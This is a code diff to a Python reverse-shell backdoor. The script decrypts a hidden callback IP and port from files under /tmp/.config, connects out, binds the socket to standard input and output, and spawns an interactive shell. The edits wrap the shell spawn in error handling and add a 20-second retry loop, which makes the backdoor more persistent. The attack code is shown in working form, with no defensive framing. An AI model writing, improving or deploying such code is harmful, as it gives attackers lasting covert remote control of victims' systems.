@@ -1,10 +1,10 @@
-from cryptography.fernet import Fernet
 import socket
 import subprocess
 import os
 import time
 import pty
 import sys
+from cryptography.fernet import Fernet
 
 def decrypt_ip_port(config_file='/tmp/.config/config.txt', key_file='/tmp/.config/key'):
     with open(key_file, 'rb') as key_in:
@@ -26,10 +26,19 @@ def establish_connection(ip, port):
             os.dup2(s.fileno(), 0)
             os.dup2(s.fileno(), 1)
             os.dup2(s.fileno(), 2)
-            pty.spawn("sh")
+
+            # Moved the shell spawning into a try block within the loop
+            try:
+                pty.spawn("sh")
+            except Exception as shell_error:
+                print(f"Shell session ended: {shell_error}", file=sys.stderr)
+            
+            time.sleep(20) # Reconnection attempt after the shell ends or fails
+
         except Exception as e:
             print(f"Connection failed: {e}", file=sys.stderr)
             time.sleep(20) # Adjusted sleep to 20 seconds
+
         finally:
             try:
                 s.close()
